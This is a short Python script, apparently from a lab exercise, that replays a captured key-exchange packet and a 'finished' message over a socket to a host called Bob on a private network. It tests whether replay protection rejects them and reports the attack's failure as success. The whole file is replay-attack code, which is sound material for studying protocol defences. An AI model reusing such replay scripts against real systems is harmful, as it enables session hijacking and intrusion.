import socket
import time


print("Replay attack with copied key (MITM)")
used_key_packet = "0000032070aa34a07aa98bf5a553d67404c8aa75115c7d5458d2c043e62080e32c6410f33de138039669281066a8251a828221599b39535515604c9138aef88dd6595bdd670d76f572b3c57659368ebc4b44e15b2963971f1040af3f419d30d74e21aab5e71105adcaba7fe858ed89b3256c2a2ce6a34c810a55b295caea2944692c29e67db4e4a9e2897e5f2b5bd63b2485a75249bc501949132b4110a7602b4e404e3ab4bbc2e4a6694bab3909a5374c732a091272910881c00920ec3fefa2150d3a169087794da400c50547c2587cf899a2c7da79cd942f6afa8684b066185c24ab196add04a7a160082decc0d2e86920bab1a594afee4727a3c547a5b9cd15306f6d6cbced79499df0cea5b06b7009b1ccd98b11727e1ce5ae1c2833617aa10c18b640174d75288435114a1ef17d237c3f2363498603c5403baf83f92b7a4aad1ab657187149fc36c45d35386239399b165fd5669577c31c304aa30d58ae3ab598c10cd02bbcb16aeaa1a7151b0dcac2079853fcb6a2d7a39add25483ddb1bf0216d061a47b6a593d19399d3356a7270ca0cf3c1aad604abd7b5b23a3edfa94c21478addc6286d7552bc7121f0470b57131d75f163b5636765e17b128a073a1334aa975436d86b2dd460f397080b3c688da497365ab2bb2545906b249818475a33c4bd128bde237ead1106432c45c428396c231d6f14cd19bc5730d2a872c9842d351a0832b32b1198ae94a353a9856dd05629c50f987b6a760248126b2cb421a894fb83d8229ee0984c9ee1c7ade94a9514c9f348b4ccacc7225acff3b413b238ce6d92ab8a05af579b72e7c80d96f94d68c047c7e34d23b52e18126984a230cbf1c427f57b178a6e105b4c08bac3cdd92101e58d3489c728695251c639ebe924e8a762e6ca748a21b726fc19376c05d16c30aad93713d112df1ac7a050b72ed9babe465f173ca1ac00b8dcd200bf83684c31ab05e33c0619454b1427d01c51f8101ff99028ba26516518284235478787b416b3516d4a1f339a35d5370165b346fef854a3b8218111b20b525b0cfb87051c803863bfc4dcb79fdc6564e69740247791f28b1b1f613f8c3d9b81ff4e772f3da3530d1810e33e4499fbb7cdd84cdc45"

# convert hex string to bytes
captured_packet = bytes.fromhex(used_key_packet)


BOB_IP = "192.168.174.181"
BOB_PORT = 65432

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    sock.connect((BOB_IP, BOB_PORT))
    print("[+] Connection established with Bob.")

    print("[!] Sending old captured Alice's key packet to Bob...")
    sock.sendall(captured_packet)

    time.sleep(1)
    reponse_bob = sock.recv(4096)
    if reponse_bob:
        print(f"[+] Bob has responded ({len(reponse_bob)} bytes). He has calculated a NEW secret.")

    bob_finished = sock.recv(1024)

    finished_alice_hexa = "0000003c89fda84f18203b4e5f7f416724935a577d08110603ce8366294cd5f88b732b7ef701883a1d43e0041e4eceed4b2eb2b27d21a8952215c197445e1a0b"

    paquet_finished_replay = bytes.fromhex(finished_alice_hexa)


    print(f"[!] Sending replayed finished message to Bob: {paquet_finished_replay[:10]} ... (total length: {len(paquet_finished_replay)} bytes)")
    sock.sendall(paquet_finished_replay)

    verdict = sock.recv(1024)
    if verdict == b"":
        print("\n[SUCCESS] Bob has rejected the message . Replay attack failed.")
        print("[=>] success+!")
except Exception as e:
    print(f"[-] Error : {e}")
finally:
    sock.close()